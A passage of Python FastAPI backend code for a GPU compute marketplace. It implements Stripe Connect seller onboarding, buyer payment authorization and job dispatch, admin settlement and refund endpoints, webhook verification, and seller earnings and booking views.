    for label, u in (("return_url", return_url), ("refresh_url", refresh_url)):
        if not u or not str(u).lower().startswith(("http://", "https://")):
            raise HTTPException(
                status_code=503,
                detail=("CONNECT_RETURN_URL_MISSING: Stripe onboarding needs an absolute "
                        f"{label}. Set PUBLIC_BASE_URL (e.g. https://app.petabyte.market) or "
                        f"CONNECT_RETURN_URL/CONNECT_REFRESH_URL, or pass {label} in the body."))
    return return_url, refresh_url


# ---------------- Seller: Stripe Connect onboarding ----------------
@app.post("/payments/connect/account", tags=["payments"])
def connect_create_account(user: dict = Depends(get_current_user),
                           db: Session = Depends(get_db),
                           data: SellerConnectModel = Body(default_factory=SellerConnectModel)):
    """Create (or return) THIS seller's connected account. Idempotent — never creates
    a second Stripe account, and a seller can only ever touch their own. The JSON body is
    OPTIONAL: POST with no body, `{}`, or `{"country": "..."}` all work."""
    me = get_user_by_username(db, _username(user))
    ca = _connect_or_409(_sc.get_or_create_connected_account, db, me,
                         country=data.country, email=data.email)
    return {"connected_account_id": ca.stripe_account_id, "onboarding_state": ca.onboarding_state,
            "payout_ready": ca.payout_ready()}

@app.post("/payments/connect/onboarding-link", tags=["payments"])
def connect_onboarding_link(user: dict = Depends(get_current_user),
                            db: Session = Depends(get_db),
                            data: OnboardingLinkModel = Body(default_factory=OnboardingLinkModel)):
    """Return a Stripe-hosted onboarding link. Body is OPTIONAL; return/refresh URLs default
    from PUBLIC_BASE_URL / CONNECT_RETURN_URL / CONNECT_REFRESH_URL when omitted."""
    me = get_user_by_username(db, _username(user))
    return_url, refresh_url = _connect_return_urls(data)      # 503 with a clear code if unset
    ca = _connect_or_409(_sc.get_or_create_connected_account, db, me)
    url = _connect_or_409(_sc.create_onboarding_link, db, ca,
                          refresh_url=refresh_url, return_url=return_url)
    return {"url": url}

@app.post("/payments/connect/refresh", tags=["payments"])
def connect_refresh(user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """Authoritative status pull from Stripe (never trust the return URL)."""
    me = get_user_by_username(db, _username(user))
    ca = db.query(dbmod.ConnectedAccount).filter(dbmod.ConnectedAccount.user_id == me.id).first()
    if not ca:
        raise HTTPException(status_code=404, detail="no connected account")
    ca = _sc.refresh_connected_account(db, ca)
    return connect_status(user, db)

@app.get("/payments/connect/status", tags=["payments"])
def connect_status(user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    me = get_user_by_username(db, _username(user))
    ca = db.query(dbmod.ConnectedAccount).filter(dbmod.ConnectedAccount.user_id == me.id).first()
    if not ca:
        return {"connected": False, "payout_ready": False, "onboarding_state": "none",
                "why_blocked": "Connect a Stripe account to receive paid jobs."}
    due = json.loads(ca.requirements_due or "[]")
    reasons = []
    if not ca.details_submitted: reasons.append("Finish Stripe onboarding.")
    if not ca.charges_enabled: reasons.append("Charges capability not active yet.")
    if not ca.payouts_enabled: reasons.append("Payouts capability not active yet.")
    if due: reasons.append(f"Stripe needs: {', '.join(due[:5])}.")
    if ca.disabled_reason: reasons.append(f"Account restricted: {ca.disabled_reason}.")
    return {"connected": True, "connected_account_id": ca.stripe_account_id,
            "onboarding_state": ca.onboarding_state, "payout_ready": ca.payout_ready(),
            "details_submitted": ca.details_submitted,
            "charges_enabled": ca.charges_enabled, "payouts_enabled": ca.payouts_enabled,
            "transfers_capability": ca.transfers_capability,
            "requirements_due": due,
            "requirements_past_due": json.loads(ca.requirements_past_due or "[]"),
            "disabled_reason": ca.disabled_reason, "country": ca.country,
            "default_currency": ca.default_currency,
            "last_synced_at": ca.last_synced_at.isoformat() if ca.last_synced_at else None,
            "why_blocked": None if ca.payout_ready() else " ".join(reasons) or "Onboarding incomplete."}


@app.get("/payments/payout/readiness", tags=["payments"])
def payout_readiness_status(user: dict = Depends(get_current_user),
                            db: Session = Depends(get_db)):
    """PROVIDER-AGNOSTIC seller payout readiness — the marketplace's single source of truth for
    "can I accept paid jobs?". Rail-neutral: it reports whichever verified, enabled rail makes
    the seller eligible (Connect today; future rails plug in without changing this contract).
    Never exposes provider secrets, bank account numbers, or identity details."""
    import payout_readiness
    me = get_user_by_username(db, _username(user))
    return payout_readiness.get_seller_payout_readiness(db, me)


# ---------------- Buyer: quote + authorize + inspect ----------------
def _spec_or_404(db, public_id):
    from db import get_spec_by_public_id
    spec = get_spec_by_public_id(db, public_id)
    if not spec:
        raise HTTPException(status_code=404, detail="GPU not found")
    return spec

@app.get("/payments/config", tags=["payments"])
def payments_config():
    """Public checkout config for the browser. Returns which Stripe mode is live and the
    PUBLISHABLE key only (safe to expose by Stripe's design — never the secret key, client
    secret, or webhook secret). The buyer UI uses this to choose between the real Stripe.js
    card element (real gateway) and the offline sandbox card confirmation (fake gateway,
    used only in tests/CI, and 404 under real Stripe). No secrets are returned."""
    from stripe_gateway import get_gateway, FakeStripeGateway
    fake = isinstance(get_gateway(), FakeStripeGateway)
    pk = os.getenv("STRIPE_PUBLISHABLE_KEY", "")
    # Report the mode from what the SERVER enforces, not just the publishable-key prefix: a real
    # gateway running live with a missing/misconfigured publishable key must NOT show the buyer a
    # "test mode — no real money" notice. Live iff payments-live is enabled or a live key is set.
    live = (os.getenv("PAYMENTS_LIVE_ENABLED", "").strip().lower() == "true"
            or pk.startswith("pk_live_"))
    return {"gateway": "fake" if fake else "real",
            "test_mode": fake or not live,
            "publishable_key": pk}

@app.get("/payments/coverage", tags=["payments"])
def payments_coverage(country: str = None):
    """Public, honest seller-payout coverage. With no args, returns the priority-market
    capability matrix (the 20 highest-value GPU-supply markets, each resolved to its REAL
    payout rail / currency / status). With ?country=XX, returns that single country's
    capability record. Read-only; reveals no secrets. 'active_today' is the only
    'payable right now' flag — the shipped dataset is honestly 0 until a real end-to-end
    payout is verified per country."""
    import payout_capabilities as _cap
    if country:
        return _cap.country_capability(country)
    return _cap.priority_capability_matrix()

@app.post("/payments/quote", tags=["payments"])
def payments_quote(data: QuoteModel, user: dict = Depends(get_current_user),
                   db: Session = Depends(get_db)):
    """Server-side quote. The browser sends only a GPU id + desired seconds; every
    amount is computed here from authoritative values."""
    spec = _spec_or_404(db, data.spec_id)
    try:
        q = _sc.quote(db, spec, data.estimated_seconds)
    except _sc.TransactionError as e:
        raise HTTPException(status_code=409, detail=str(e))
    ready = _sc.seller_payout_ready(db, spec.user_id)
    return {"currency": q["currency"], "price_per_hour_minor": q["price_per_hour_minor"],
            "estimated_seconds": q["estimated_seconds"],
            "estimated_compute_amount": q["estimated_compute_amount"],
            "authorization_amount": q["authorization_amount"],
            "seller_payout_ready": ready,
            "note": "Final charge is based on ACTUAL metered usage; the authorization "
                    "is the maximum hold, not a completed payment."}

@app.post("/payments/authorize", tags=["payments"])
def payments_authorize(data: AuthorizeModel, request: Request,
                       user: dict = Depends(get_current_user),
                       db: Session = Depends(get_db)):
    """Create the internal transaction + a manual-capture PaymentIntent. Returns only
    the client secret and safe display info. Rate-limited."""
    me = get_user_by_username(db, _username(user))
    spec = _spec_or_404(db, data.spec_id)
    try:
        tx = _sc.authorize(db, me, spec, data.estimated_seconds)
    except _sc.TransactionError as e:
        raise HTTPException(status_code=409, detail=str(e))
    audit(db, "payment.authorize", actor=me.username, resource_type="compute_tx",
          resource_id=tx.public_id, ip=_client_ip(request))
    return {"transaction_id": tx.public_id, "client_secret": getattr(tx, "_client_secret", None),
            # The PaymentIntent id (pi_…) is NOT secret — only client_secret is. Returning it
            # lets a test runner confirm the PI via the Stripe SDK without fragile parsing of
            # client_secret. NEVER log client_secret.
            "payment_intent_id": tx.stripe_payment_intent_id,
            "authorization_amount": tx.authorization_amount, "currency": tx.currency,
            "status": tx.status,
            "publishable_key": os.getenv("STRIPE_PUBLISHABLE_KEY", "")}

@app.post("/payments/{public_id}/confirm", tags=["payments"])
def payments_confirm(public_id: str, user: dict = Depends(get_current_user),
                     db: Session = Depends(get_db)):
    """Reconcile authorization server-side (verifies with Stripe). The authoritative
    signal is the webhook; this lets the buyer poll without trusting the redirect."""
    me = get_user_by_username(db, _username(user))
    tx = _sc.get_tx_by_public_id(db, public_id)
    if not tx or tx.buyer_id != me.id:
        raise HTTPException(status_code=404, detail="transaction not found")
    try:
        _sc.mark_authorized(db, tx)
    except _sc.TransactionError as e:
        raise HTTPException(status_code=409, detail=str(e))
    return _ctx_view(db, tx, viewer=me)


@app.post("/payments/{public_id}/simulate-card", tags=["payments"],
          summary="[FAKE GATEWAY ONLY] confirm a PaymentIntent offline",
          description="**FAKE GATEWAY ONLY.** Stands in for the client-side Stripe.js card "
                      "confirmation when running against the in-process FakeStripeGateway "
                      "(offline end-to-end tests). It returns **404 whenever the real Stripe "
                      "gateway is active**, so it can NEVER confirm a real (test or live) "
                      "PaymentIntent. For a real Stripe TEST E2E, confirm the PaymentIntent "
                      "with the Stripe SDK instead — see scripts/e2e_marketplace_test.py.")
def payments_simulate_card(public_id: str, user: dict = Depends(get_current_user),
                           db: Session = Depends(get_db)):
    """FAKE GATEWAY ONLY — stands in for the client-side Stripe.js card confirmation
    when running against the in-process fake gateway (offline end-to-end tests).
    Moves the manual-capture PaymentIntent to 'requires_capture'. Returns 404 in
    real Stripe mode, so it is inert in production (no real PI can be confirmed here).
    The real Stripe TEST E2E runner confirms via the Stripe SDK, not this endpoint."""
    from stripe_gateway import get_gateway, FakeStripeGateway
    gw = get_gateway()
    if not isinstance(gw, FakeStripeGateway):
        raise HTTPException(status_code=404, detail="not found")
    me = get_user_by_username(db, _username(user))
    tx = _sc.get_tx_by_public_id(db, public_id)
    if not tx or tx.buyer_id != me.id:
        raise HTTPException(status_code=404, detail="transaction not found")
    if not tx.stripe_payment_intent_id:
        raise HTTPException(status_code=409, detail="no payment intent on this transaction")
    gw.confirm_payment_intent(tx.stripe_payment_intent_id)
    return {"ok": True, "status": "requires_capture",
            "note": "sandbox card confirmation (fake gateway only)"}

@app.get("/payments/{public_id}", tags=["payments"])
def payments_get(public_id: str, user: dict = Depends(get_current_user),
                 db: Session = Depends(get_db)):
    me = get_user_by_username(db, _username(user))
    tx = _sc.get_tx_by_public_id(db, public_id)
    if not tx or (me.id not in (tx.buyer_id, tx.seller_id) and not _is_admin(me)):
        raise HTTPException(status_code=404, detail="transaction not found")
    return _ctx_view(db, tx, viewer=me, admin=_is_admin(me))

@app.get("/payments/{public_id}/receipt", tags=["payments"])
def payments_receipt(public_id: str, user: dict = Depends(get_current_user),
                     db: Session = Depends(get_db)):
    me = get_user_by_username(db, _username(user))
    tx = _sc.get_tx_by_public_id(db, public_id)
    if not tx or (me.id not in (tx.buyer_id, tx.seller_id) and not _is_admin(me)):
        raise HTTPException(status_code=404, detail="transaction not found")
    return {"transaction_id": tx.public_id, "status": tx.status, "currency": tx.currency,
            "authorized_maximum": tx.authorization_amount,
            "final_captured_amount": tx.captured_amount,
            "refunded_amount": tx.refunded_amount,
            "metered_seconds": tx.metering_seconds,
            "is_completed_payment": tx.status in ("PAYMENT_CAPTURED", "SELLER_TRANSFERRED", "COMPLETED"),
            "note": "The authorized maximum is a hold; you are charged only the final captured amount."}


@app.get("/payments/{public_id}/proof", tags=["payments"])
def payment_proof(public_id: str, user: dict = Depends(get_current_user),
                  db: Session = Depends(get_db)):
    """The unified END-TO-END proof for one transaction — the single artifact a demo/DD wants:

      * payment  — the Stripe payment (real test-object or live per `mode`): authorized max,
        captured, refunded, metered seconds;
      * compute  — the cryptographic per-job receipt (Ed25519 signature over the signed payload,
        sha256 of the real output bytes, node pubkey) with a LIVE server re-verification;
      * payout   — the provider payout: seller net, obligation state, and the Stripe transfer id.

    Nothing here is simulated when the server runs the real gateway. Buyer / seller / admin scoped."""
    import trust as _trust
    _CAPTURED = ("PAYMENT_CAPTURED", "SELLER_TRANSFER_PENDING", "SELLER_TRANSFERRED", "COMPLETED")
    me = get_user_by_username(db, _username(user))
    tx = _sc.get_tx_by_public_id(db, public_id)
    if not tx or (me.id not in (tx.buyer_id, tx.seller_id) and not _is_admin(me)):
        raise HTTPException(status_code=404, detail="transaction not found")
    task = (db.query(dbmod.Task).filter(dbmod.Task.id == tx.task_id).first()
            if tx.task_id else None)
    obl = (db.query(dbmod.PayoutObligation)
           .filter(dbmod.PayoutObligation.compute_tx_id == tx.id).first())
    cap = tx.captured_amount or 0
    identity_holds = (cap == (tx.platform_fee_amount or 0) + (tx.seller_net_amount or 0)
                      if cap else None)
    return {
        "transaction_id": tx.public_id,
        "status": tx.status,
        "mode": tx.mode,
        "is_demo": tx.is_demo,
        "currency": tx.currency,
        "payment": {
            "payment_intent_id": tx.stripe_payment_intent_id,
            "authorized_maximum_minor": tx.authorization_amount,
            "captured_minor": tx.captured_amount,
            "refunded_minor": tx.refunded_amount,
            "metered_seconds": tx.metering_seconds,
            "captured": tx.status in _CAPTURED,
        },
        "compute": _trust.build_receipt(db, task) if task else None,
        "payout": {
            "seller_net_minor": tx.seller_net_amount,
            "platform_fee_minor": tx.platform_fee_amount,
            "transferred_minor": tx.transferred_amount,
            "stripe_transfer_id": tx.stripe_transfer_id,
            "obligation_state": (obl.state if obl else None),
            "obligation_mode": (obl.mode if obl else None),
            "paid": bool(tx.stripe_transfer_id) and (obl.state == "paid" if obl else False),
            "hold_status": ("released" if (obl and obl.state == "paid")
                            else "held" if obl else "none"),
        },
        "accounting_identity_holds": identity_holds,
        "note": ("End-to-end proof: a real Stripe payment (test or live per `mode`), a "
                 "cryptographically signed compute result you can re-verify offline, and the "
                 "provider payout. Nothing is simulated when run against the real gateway."),
    }


@app.get("/payments/{public_id}/timeline", tags=["payments"])
def payment_timeline(public_id: str, user: dict = Depends(get_current_user),
                     db: Session = Depends(get_db)):
    """The immutable, append-only timeline for a transaction — nothing hidden. Buyer,
    seller, and admins each see every state change (who, when, why), plus a plain
    'why it failed' line when the transaction ended in a failure state."""
    import marketplace_insight as mi
    me = get_user_by_username(db, _username(user))
    tx = _sc.get_tx_by_public_id(db, public_id)
    if not tx or (me.id not in (tx.buyer_id, tx.seller_id) and not _is_admin(me)):
        raise HTTPException(status_code=404, detail="transaction not found")
    events = (db.query(dbmod.ComputeTxEvent)
              .filter(dbmod.ComputeTxEvent.tx_id == tx.id)
              .order_by(dbmod.ComputeTxEvent.id).all())
    is_admin = _is_admin(me)
    # A failure `reason` can embed str(StripeError) (gateway/decline/account internals).
    # Admins get the raw reason for troubleshooting; buyers/sellers get sanitized text.
    def _reason(e):
        if is_admin:
            return e.reason
        if e.to_state in mi.TX_FAILED and e.reason:
            return mi.explain_failure(e.to_state)
        return e.reason
    timeline = [{"at": e.created_at.isoformat() if e.created_at else None,
                 "from": e.from_state, "to": e.to_state, "reason": _reason(e), "by": e.actor}
                for e in events]
    why_failed = None
    if tx.status in mi.TX_FAILED:
        if is_admin:
            fev = [e for e in events if e.to_state == tx.status and e.reason]
            why_failed = fev[-1].reason if fev else f"transaction ended in {tx.status}"
        else:
            why_failed = mi.explain_failure(tx.status)
    return {"transaction_id": tx.public_id, "status": tx.status,
            "timeline": timeline, "why_failed": why_failed}

@app.post("/payments/{public_id}/cancel", tags=["payments"])
def payments_cancel(public_id: str, request: Request,
                    user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """Buyer cancels: void the authorization, release the GPU, charge $0.

    Pre-dispatch this cancels the authorization outright. An ACTIVELY running/settling dispatched
    job can't be cancelled (409). But a dispatched job that has since reached a TERMINAL failure
    state (JOB_FAILED / CAPTURE_FAILED / DISPATCH_FAILED / ...) is no longer running, so we release
    its reservation IMMEDIATELY here instead of leaving the GPU unit + authorization hold pinned
    until the next abandoned-reservation reaper cycle."""
    import marketplace_insight as mi
    me = get_user_by_username(db, _username(user))
    tx = _sc.get_tx_by_public_id(db, public_id)
    if not tx or tx.buyer_id != me.id:
        raise HTTPException(status_code=404, detail="transaction not found")
    if tx.task_id and tx.status not in mi.TX_FAILED:
        raise HTTPException(status_code=409, detail="job already dispatched; cannot cancel")
    if tx.status in mi.TX_FAILED:
        _sc.release_failed_reservation(db, tx, reason="buyer cancelled after failure")
    else:
        _sc.cancel_authorization(db, tx, reason="buyer cancelled")
    audit(db, "payment.cancel", actor=me.username, resource_type="compute_tx",
          resource_id=tx.public_id, ip=_client_ip(request))
    return _ctx_view(db, tx, viewer=me)


@app.post("/payments/{public_id}/reserve", tags=["payments"])
def payments_reserve(public_id: str, user: dict = Depends(get_current_user),
                     db: Session = Depends(get_db)):
    """Buyer reserves the GPU for their OWN transaction — but ONLY after the card is
    authorized. reserve_gpu requires PAYMENT_AUTHORIZED, so a job can never be reserved
    (and thus never dispatched) without a verified Stripe authorization. This is the
    Stripe-native replacement for wallet-funded booking: no free credit, no escrow."""
    me = get_user_by_username(db, _username(user))
    tx = _sc.get_tx_by_public_id(db, public_id)
    if not tx or tx.buyer_id != me.id:
        raise HTTPException(status_code=404, detail="transaction not found")
    try:
        _sc.reserve_gpu(db, tx)
    except _sc.TransactionError as e:
        raise HTTPException(status_code=409, detail=str(e))
    return _ctx_view(db, tx, viewer=me)


@app.post("/payments/{public_id}/dispatch", tags=["payments"])
def payments_dispatch(public_id: str, data: DispatchModel,
                      user: dict = Depends(get_current_user),
                      db: Session = Depends(get_db)):
    """Buyer dispatches their OWN reserved job. dispatch_job re-verifies with Stripe that
    the authorization still holds before any compute starts — no payment, no job."""
    me = get_user_by_username(db, _username(user))
    tx = _sc.get_tx_by_public_id(db, public_id)
    if not tx or tx.buyer_id != me.id:
        raise HTTPException(status_code=404, detail="transaction not found")
    try:
        _sc.dispatch_job(db, tx, task_type=data.task_type, code=data.code)
    except _sc.TransactionError as e:
        raise HTTPException(status_code=409, detail=str(e))
    v = _ctx_view(db, tx, viewer=me)
    v["task_id"] = tx.task_id          # so the browser can poll the workload's result
    return v


# ---------------- Internal job/settlement ops (admin-gated in this build) ----------------
# In production these are driven by the job orchestrator with a service credential; here
# they require admin so the flow is testable and safe by default.
def _admin_tx(db, public_id, admin):
    tx = _sc.get_tx_by_public_id(db, public_id)
    if not tx:
        raise HTTPException(status_code=404, detail="transaction not found")
    return tx

@app.post("/admin/payments/{public_id}/reserve", tags=["payments"])
def admin_reserve(public_id: str, admin=Depends(require_admin), db: Session = Depends(get_db)):
    tx = _admin_tx(db, public_id, admin)
    try:
        _sc.reserve_gpu(db, tx)
    except _sc.TransactionError as e:
        raise HTTPException(status_code=409, detail=str(e))
    return _ctx_view(db, tx, admin=True)

@app.post("/admin/payments/{public_id}/dispatch", tags=["payments"])
def admin_dispatch(public_id: str, data: DispatchModel,
                   admin=Depends(require_admin), db: Session = Depends(get_db)):
    tx = _admin_tx(db, public_id, admin)
    try:
        _sc.dispatch_job(db, tx, task_type=data.task_type, code=data.code)
    except _sc.TransactionError as e:
        raise HTTPException(status_code=409, detail=str(e))
    return _ctx_view(db, tx, admin=True)

@app.post("/admin/payments/{public_id}/meter", tags=["payments"])
def admin_meter(public_id: str, data: MeterModel,
                admin=Depends(require_admin), db: Session = Depends(get_db)):
    tx = _admin_tx(db, public_id, admin)
    try:
        _sc.record_metering(db, tx, actual_seconds=data.actual_seconds, source=data.source)
    except _sc.TransactionError as e:
        raise HTTPException(status_code=409, detail=str(e))
    return _ctx_view(db, tx, admin=True)

@app.post("/admin/payments/{public_id}/capture", tags=["payments"])
def admin_capture(public_id: str, admin=Depends(require_admin), db: Session = Depends(get_db)):
    tx = _admin_tx(db, public_id, admin)
    try:
        _sc.capture(db, tx)
    except _sc.TransactionError as e:
        raise HTTPException(status_code=409, detail=str(e))
    return _ctx_view(db, tx, admin=True)

@app.post("/admin/payments/{public_id}/transfer", tags=["payments"])
def admin_transfer(public_id: str, admin=Depends(require_admin), db: Session = Depends(get_db)):
    tx = _admin_tx(db, public_id, admin)
    try:
        _sc.transfer_to_seller(db, tx)
    except _sc.TransactionError as e:
        raise HTTPException(status_code=409, detail=str(e))
    return _ctx_view(db, tx, admin=True)

@app.post("/admin/payments/{public_id}/refund", tags=["payments"])
def admin_refund(public_id: str, data: RefundModel, request: Request,
                 admin=Depends(require_admin), db: Session = Depends(get_db)):
    _admin_reason(data.reason)
    tx = _admin_tx(db, public_id, admin)
    try:
        _sc.refund(db, tx, amount=data.amount, actor=admin.username, reason=data.reason)
    except _sc.TransactionError as e:
        raise HTTPException(status_code=409, detail=str(e))
    audit(db, "payment.refund", actor=admin.username, resource_type="compute_tx",
          resource_id=tx.public_id, ip=_client_ip(request), detail=data.reason)
    return _ctx_view(db, tx, admin=True)


# ---------------- Admin financial dashboard ----------------
@app.get("/admin/payments", tags=["payments"])
def admin_payments_list(status: Optional[str] = None, limit: int = Query(100, le=500),
                        admin=Depends(require_admin), db: Session = Depends(get_db)):
    q = db.query(dbmod.ComputeTransaction).order_by(dbmod.ComputeTransaction.id.desc())
    if status:
        q = q.filter(dbmod.ComputeTransaction.status == status)
    return {"transactions": [_ctx_view(db, t, admin=True) for t in q.limit(limit).all()]}

@app.get("/admin/payments/{public_id}", tags=["payments"])
def admin_payment_detail(public_id: str, admin=Depends(require_admin),
                         db: Session = Depends(get_db)):
    tx = _sc.get_tx_by_public_id(db, public_id)
    if not tx:
        raise HTTPException(status_code=404, detail="transaction not found")
    events = db.query(dbmod.ComputeTxEvent).filter(
        dbmod.ComputeTxEvent.tx_id == tx.id).order_by(dbmod.ComputeTxEvent.id).all()
    ops = db.query(dbmod.PaymentOperation).filter(dbmod.PaymentOperation.tx_id == tx.id).all()
    setts = db.query(dbmod.Settlement).filter(dbmod.Settlement.tx_id == tx.id).all()
    ledger = db.query(dbmod.LedgerEntry).filter(
        dbmod.LedgerEntry.entry_type.like("compute_%")).all()
    rel = [e for e in ledger]  # entries reference tx.public_id via tx; keep simple: show compute entries
    return {"transaction": _ctx_view(db, tx, admin=True),
            "pricing_snapshot": json.loads(tx.pricing_snapshot),
            "state_history": [{"from": e.from_state, "to": e.to_state, "reason": e.reason,
                               "actor": e.actor, "at": e.created_at.isoformat() if e.created_at else None}
                              for e in events],
            "operations": [{"type": o.op_type, "state": o.state, "key": o.internal_idempotency_key,
                            "external_id": o.external_object_id, "attempts": o.attempt_count,
                            "error": o.last_error} for o in ops],
            "settlements": [{"version": s.version, "captured": s.captured_amount,
                             "seller": s.seller_amount, "platform_fee": s.platform_fee,
                             "refund": s.refund_amount} for s in setts]}

@app.get("/admin/webhooks", tags=["payments"])
def admin_webhooks(limit: int = Query(100, le=500), state: Optional[str] = None,
                   admin=Depends(require_admin), db: Session = Depends(get_db)):
    q = db.query(dbmod.StripeWebhookEvent).order_by(dbmod.StripeWebhookEvent.received_at.desc())
    if state:
        q = q.filter(dbmod.StripeWebhookEvent.processing_state == state)
    return {"events": [{"id": e.stripe_event_id, "type": e.event_type,
                        "state": e.processing_state, "attempts": e.attempt_count,
                        "account": e.account_context, "error": e.error,
                        "received_at": e.received_at.isoformat() if e.received_at else None}
                       for e in q.limit(limit).all()]}


# ---------------- Seller earnings (Stripe) ----------------
@app.get("/seller/earnings/stripe", tags=["payments"])
def seller_stripe_earnings(user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    me = get_user_by_username(db, _username(user))
    txs = db.query(dbmod.ComputeTransaction).filter(
        dbmod.ComputeTransaction.seller_id == me.id).order_by(
        dbmod.ComputeTransaction.id.desc()).limit(200).all()
    ca = db.query(dbmod.ConnectedAccount).filter(dbmod.ConnectedAccount.user_id == me.id).first()
    gross = sum(t.captured_amount for t in txs)
    fee = sum(t.platform_fee_amount for t in txs)
    net = sum(t.seller_net_amount for t in txs)
    transferred = sum(t.transferred_amount for t in txs)
    return {"currency": (ca.default_currency if ca else "usd"),
            "gross_compute_minor": gross, "platform_commission_minor": fee,
            "net_earnings_minor": net, "transferred_minor": transferred,
            "transfers_pending_minor": net - transferred,
            "payout_events": _sc.latest_payout_events(db, ca.stripe_account_id) if ca else [],
            "jobs": [{"transaction_id": t.public_id, "status": t.status,
                      "captured": t.captured_amount, "net": t.seller_net_amount,
                      "transferred": t.transferred_amount,
                      "stripe_transfer_id": t.stripe_transfer_id} for t in txs]}


# ---------------- Stripe platform webhook ----------------
@app.post("/webhooks/stripe")
async def stripe_webhook(request: Request, db: Session = Depends(get_db)):
    """Authoritative async Stripe state. Verifies the signature over the RAW body,
    stores the event, and processes it at most once. A bad signature is rejected; an
    already-processed event returns 200 (idempotent)."""
    raw = await request.body()
    sig = request.headers.get("Stripe-Signature", "")
    secret = os.getenv("STRIPE_WEBHOOK_SECRET", "")
    if not secret:
        raise HTTPException(status_code=503, detail="webhook secret not configured")
    try:
        event = _get_gateway().construct_event(raw, sig, secret)
    except Exception:                                   # invalid signature / stale ts
        raise HTTPException(status_code=400, detail="invalid signature")
    try:
        return _sc.process_webhook_event(db, event)
    except Exception as e:                              # handler failure -> 500 so Stripe retries
        logger.exception("stripe webhook handler failed: %s", event.get("type"))
        raise HTTPException(status_code=500, detail="handler error")


@app.get("/wallet", tags=["wallet"])
def wallet(user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    me = get_user_by_username(db, _username(user))
    wd = float(withdrawable_earnings(db, me))
    return {"balance": round(me.balance, 4), "earnings": round(me.earnings, 4),
            "withdrawable": round(wd, 4),
            "clearing": round(max(0.0, float(me.earnings) - wd), 4),
            "instant_eligible": is_payout_matured(db, me),
            "hold_hours": EARNINGS_HOLD_HOURS}


@app.get("/me", tags=["account"])
def whoami_profile(user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """Everything the profile hub needs about the signed-in user."""
    from db import SellerSpec, Booking
    u = get_user_by_username(db, _username(user))
    if not u:
        raise HTTPException(status_code=404, detail="User not found")
    nodes = db.query(SellerSpec).filter(SellerSpec.user_id == u.id).count()
    bookings = db.query(Booking).filter(
        (Booking.buyer_id == u.id) | (Booking.seller_id == u.id)).count()
    return {
        "username": u.username, "email": u.email, "role": u.role,
        "email_verified": bool(u.email_verified),   # the UI must know: it gates payouts
        "reputation": u.reputation, "balance": round(u.balance, 2),
        "earnings": round(u.earnings, 2), "can_accept_paid_jobs": u.can_accept_paid_jobs,
        "is_admin": _is_admin(u), "nodes": nodes, "bookings": bookings,
    }


@app.get("/account/specs")
def account_specs(user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """The signed-in user's own listed nodes (as a seller)."""
    from db import SellerSpec
    u = get_user_by_username(db, _username(user))
    rows = db.query(SellerSpec).filter(SellerSpec.user_id == u.id).order_by(
        SellerSpec.id.desc()).all()
    return {"specs": [{
        "id": s.id, "gpu_model": s.gpu_model, "price_per_hour": s.price_per_hour,
        "status": s.status, "attested": s.attested, "confidential": s.confidential,
        "region": s.region, "available_units": s.available_units,
        "jobs_completed": s.jobs_completed, "jobs_failed": s.jobs_failed,
    } for s in rows], "count": len(rows)}


@app.get("/account/bookings")
def account_bookings(user: dict = Depends(get_current_user), db: Session = Depends(get_db),
                     limit: int = Query(50, le=200)):
    """The signed-in user's bookings, whether they bought or sold."""
    from db import Booking, SellerSpec
    u = get_user_by_username(db, _username(user))
    rows = db.query(Booking).filter(
        (Booking.buyer_id == u.id) | (Booking.seller_id == u.id)).order_by(
        Booking.id.desc()).limit(limit).all()
    specs = {s.id: s.gpu_model for s in db.query(SellerSpec).all()}
    return {"bookings": [{
        "id": b.id, "role": "buyer" if b.buyer_id == u.id else "seller",
        "gpu_model": specs.get(b.spec_id, "?"), "hours": b.hours,
        "gross_amount": round(b.gross_amount, 2), "status": b.status,
        "created_at": b.created_at.isoformat() if b.created_at else None,
    } for b in rows], "count": len(rows)}


@app.get("/seller/earnings", tags=["seller"])
def seller_earnings(user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """Seller dashboard: utilization, earnings, active rentals, per-node breakdown.
    Sellers churn without visibility — this is that visibility."""
    from db import SellerSpec, Booking
    me = get_user_by_username(db, _username(user))
    specs = db.query(SellerSpec).filter(SellerSpec.user_id == me.id).all()
    total_units = sum((s.total_units or 1) for s in specs)
    busy_units = sum(max(0, (s.total_units or 1) - (s.available_units or 0)) for s in specs)
    online = sum(1 for s in specs if spec_is_live(s))
    active = db.query(Booking).filter(
        Booking.seller_id == me.id, Booking.status.in_(["escrowed", "active"])).count()
    released = db.query(Booking).filter(
        Booking.seller_id == me.id, Booking.status == "released").count()
    per_spec = [{
        "gpu_model": s.gpu_model or "CPU", "units": s.total_units or 1,
        "busy": max(0, (s.total_units or 1) - (s.available_units or 0)),
        "price_per_hour": s.price_per_hour, "auto_price": bool(s.auto_price),
        "min_price": s.min_price, "max_price": s.max_price,
        "online": spec_is_live(s), "reputation": compute_reputation(db, s)["score"],
        "jobs_completed": s.jobs_completed, "jobs_failed": s.jobs_failed,
    } for s in specs]
    return {"earnings_total": round(me.earnings or 0, 2), "nodes": len(specs),
            "nodes_online": online, "total_units": total_units, "busy_units": busy_units,
            "utilization": round(100.0 * busy_units / total_units, 1) if total_units else 0.0,
            "active_rentals": active, "completed_rentals": released, "specs": per_spec,
            "recent_price_changes": _recent_price_changes(db, [s.id for s in specs])}


def _recent_price_changes(db, spec_ids, limit=10):
    from db import PriceChange
    if not spec_ids:
        return []
    rows = db.query(PriceChange).filter(PriceChange.spec_id.in_(spec_ids)).order_by(
        PriceChange.id.desc()).limit(limit).all()
    return [{"spec_id": p.spec_id, "old": p.old_price, "new": p.new_price,
             "utilization": p.utilization, "reason": p.reason,
             "at": p.created_at.isoformat() if p.created_at else None} for p in rows]


@app.get("/bookings/{booking_id}")
def booking_status(booking_id: int, user: dict = Depends(get_current_user),
                   db: Session = Depends(get_db)):
    from db import Booking
    me = get_user_by_username(db, _username(user))
    b = db.query(Booking).filter(Booking.id == booking_id).first()
    if not b or not me or me.id not in (b.buyer_id, b.seller_id):
        raise HTTPException(status_code=404, detail="Booking not found")
    from db import RoutingDecision
    rd = db.query(RoutingDecision).filter(
        RoutingDecision.booking_id == b.id).order_by(RoutingDecision.id.desc()).first()
    return {"booking_id": b.id, "status": b.status, "gross_amount": b.gross_amount,
